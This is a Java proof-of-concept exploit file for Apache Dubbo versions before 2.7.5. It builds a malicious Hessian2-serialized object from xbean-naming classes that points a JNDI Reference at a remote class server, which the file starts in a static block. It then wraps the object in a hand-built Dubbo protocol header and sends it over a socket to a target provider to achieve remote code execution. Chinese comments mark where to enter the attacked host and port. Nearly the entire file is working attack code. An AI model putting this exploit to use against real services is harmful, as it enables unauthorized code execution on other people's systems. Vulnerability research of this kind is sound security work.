package com.threedr3am.bug.dubbo;

import com.caucho.hessian.io.Hessian2Output;
import com.threedr3am.bug.common.server.HTTPServer;
import com.threedr3am.bug.common.utils.Reflections;
import com.threedr3am.bug.dubbo.support.NoWriteReplaceSerializerFactory;
import com.threedr3am.bug.dubbo.utils.ToStringUtil;
import java.io.ByteArrayOutputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.util.HashMap;
import java.util.Random;
import javax.naming.Context;
import javax.naming.Reference;
import org.apache.dubbo.common.io.Bytes;
import org.apache.xbean.naming.context.ContextUtil.ReadOnlyBinding;
import org.apache.xbean.naming.context.WritableContext;

/**
 * dubbo 默认配置，即hessian2反序列化，都可RCE（dubbo版本 < 2.7.5）
 *
 * <dependency>
 *   <groupId>org.apache.xbean</groupId>
 *   <artifactId>xbean-naming</artifactId>
 *   <version>4.15</version>
 * </dependency>
 *
 * @author threedr3am
 */
public class XBeanPoc {

  static {
    HTTPServer.run(null);
  }

  public static void main(String[] args) throws Exception {
    Context ctx = Reflections.createWithoutConstructor(WritableContext.class);
    Reference ref = new Reference("Calc", "Calc","http://127.0.0.1:8080/");
    ReadOnlyBinding binding = new ReadOnlyBinding("foo", ref, ctx);

    Object s = ToStringUtil.makeToStringTrigger(binding);

    ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();

    // header.
    byte[] header = new byte[16];
    // set magic number.
    Bytes.short2bytes((short) 0xdabb, header);
    // set request and serialization flag.
    header[2] = (byte) ((byte) 0x80 | 2);

    // set request id.
    Bytes.long2bytes(new Random().nextInt(100000000), header, 4);

    ByteArrayOutputStream hessian2ByteArrayOutputStream = new ByteArrayOutputStream();
    Hessian2Output out = new Hessian2Output(hessian2ByteArrayOutputStream);
    NoWriteReplaceSerializerFactory sf = new NoWriteReplaceSerializerFactory();
    sf.setAllowNonSerializable(true);
    out.setSerializerFactory(sf);

    //todo 经测试，以下4个随意填
    //注册中心获取到的service全限定名、版本号、方法名
    out.writeString("2.0.2");
    out.writeString("com.threedr3am.learn.server.boot.DemoXXXXXXXXService");
    out.writeString("1.0");
    out.writeString("hello");
    //todo 方法描述不需要修改，因为此处需要指定map的payload去触发
    out.writeString("Ljava/util/Map;");
    out.writeObject(s);
    out.writeObject(new HashMap());
    out.close();

    Bytes.int2bytes(hessian2ByteArrayOutputStream.size(), header, 12);
    byteArrayOutputStream.write(header);
    byteArrayOutputStream.write(hessian2ByteArrayOutputStream.toByteArray());

    byte[] bytes = byteArrayOutputStream.toByteArray();

    //todo 此处填写被攻击的dubbo服务提供者地址和端口
    Socket socket = new Socket("127.0.0.1", 20880);
    OutputStream outputStream = socket.getOutputStream();
    outputStream.write(bytes);
    outputStream.flush();
    outputStream.close();
  }
}
